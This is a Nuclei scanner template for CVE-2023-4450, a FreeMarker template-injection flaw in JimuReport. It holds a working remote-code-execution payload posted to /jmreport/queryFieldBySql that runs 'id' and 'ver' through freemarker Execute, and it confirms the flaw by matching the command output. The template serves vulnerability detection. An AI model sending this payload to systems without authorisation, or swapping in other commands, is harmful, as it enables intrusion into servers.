id: 'CVE-2023-4450'

info:
  name: 'JimuReport FreeMarker SSTI RCE (CVE-2023-4450)'
  author: 'Sumanth Vankineni'
  severity: critical
  description: |
    A vulnerability was found in jeecgboot JimuReport up to version 1.6.0. It has been declared as critical. Affected by this vulnerability is the Template Handler component. The vulnerability allows for server-side template injection (SSTI), leading to arbitrary code execution. The attack can be launched remotely. This exploit has been disclosed to the public and may be used. Upgrading to version 1.6.1 addresses this issue. It is recommended to upgrade the affected component.
    
    - NVD CVSS Score: 9.8 CRITICAL (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
    - VulDB CVSS Score: 6.3 MEDIUM (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)
    
    References:
      - https://github.com/advisories/GHSA-j8h5-8rrr-m6j9
      - https://whoopsunix.com/docs/java/named%20module/
      - VDB-237571
  tags: jimureport, ssti, rce, freemarker, cve-2023-4450

requests:
  - method: POST
    path:
      - "{{BaseURL}}/jmreport/queryFieldBySql"
    headers:
      Content-Type: application/json
      User-Agent: Nuclei
    body: |
      {
        "sql": "select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}'"
      }
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "result: uid=[0-9]+\\(.*\\) gid=[0-9]+\\(.*\\) groups=[0-9]+\\(.*\\)"
        part: body
      - type: status
        status:
          - 200
  - method: POST
    path:
      - "{{BaseURL}}/jmreport/queryFieldBySql"
    headers:
      Content-Type: application/json
      User-Agent: Nuclei
    body: |
      {
        "sql": "select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"ver\")}'"
      }
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "result: .*Windows.*"
        part: body
      - type: status
        status:
          - 200
